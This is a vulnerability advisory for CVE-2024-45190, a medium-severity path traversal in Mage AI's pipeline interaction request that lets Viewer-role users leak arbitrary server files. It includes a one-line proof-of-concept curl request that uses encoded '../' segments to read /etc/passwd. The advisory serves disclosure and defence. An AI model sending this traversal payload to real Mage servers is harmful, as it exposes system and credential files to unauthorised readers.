---
description: CVE-2024-45190, MEDIUM, Mage AI pipeline interaction request remote arbitrary file leak
title: Mage AI pipeline interaction request remote arbitrary file leak
date_published: "2024-08-23"
last_updated: "2024-08-23"
xray_id: JFSA-2024-001039605
vul_id: CVE-2024-45190
cvss: 6.5
severity: medium
discovered_by: Ori Hollander
type: vulnerability

---

## Summary

Mage AI pipeline interaction request remote arbitrary file leak

## Component

mage-ai

## Affected versions

(,)

## Description

Mage AI allows remote users with the "Viewer" role to leak arbitrary files from the Mage server due to a path traversal in the "Pipeline Interaction" request

## PoC

```bash
curl -X GET
'http://localhost:6789/api/pipelines/example_pipeline/interaction/..%2F..%2F..%2
F..%2Fetc%2Fpasswd?api_key=<USER API KEY>' -H 'Authorization: Bearer
<USER TOKEN>'
```



## Vulnerability Mitigations

No mitigations are supplied for this issue

## References

No references are supplied for this issue

